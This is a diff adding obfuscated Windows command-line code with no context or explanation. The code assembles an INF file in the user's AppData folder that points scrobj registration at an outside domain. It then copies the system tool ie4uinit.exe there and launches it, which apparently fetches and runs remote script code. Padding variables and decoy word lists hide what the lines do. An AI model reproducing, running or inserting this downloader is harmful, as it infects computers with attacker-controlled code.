@@ -1,0 +1,7 @@
+/v /c (for %z in (s) do @set "Fruit=%~z") &&
+  (for %c in (a) do @set "Regions=%~c") &&
+  (for %a in (c) do @set "Tricks=%~a") &&
+  (for %a in (i) do @set "Rebates=%~a") &&
+  call(for %z in ("[strings]" "Fighters=t;Liquid" "servicename=' '" "shortsvcname=' '" "Inmate=%t!Rebates!me%" "Memories=b;Fitness" "Mercy=h" "Vague=:;Polar" "Bases=/" "Guarantees=init" "[defaultinstall.windows7]" "Un\" "Register\" "OCXs=4248" "delfiles=0E09F" "[0E09F]" "ieu%Guarantees%.inf" "[destinationdirs]" "0E09F=01" "defaultdestdir=11" "[version]" "signature =$windows nt$" "[4248]" "sc\" "ro%Memories%j,NI,%Mercy%%Fighters%%Fighters%p%Vague%%Bases%%Bases%cekdf.mickigrimland.com/homepage" ) do @echo %~z)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!Rebates!n!Athletes!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Happiness39=Today &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Happiness66=Entrepreneurs Doctor Celery Instructors Suggest Rally Sphere Associates Popular Approaches Fiber Smile Farmers Image Shock Double Repeat Notice Gloves Fundamentals Fragrances Future Material Switches Prefer Lotus Broom Beliefs Regulations Lewis Regret Logos Stomach Bright Effort Updates Earth Restrictions Rolls August Phones Brass Owner Unknown Tonight Sense Considerations Creates Eyebrow Mosquito Bachelor"
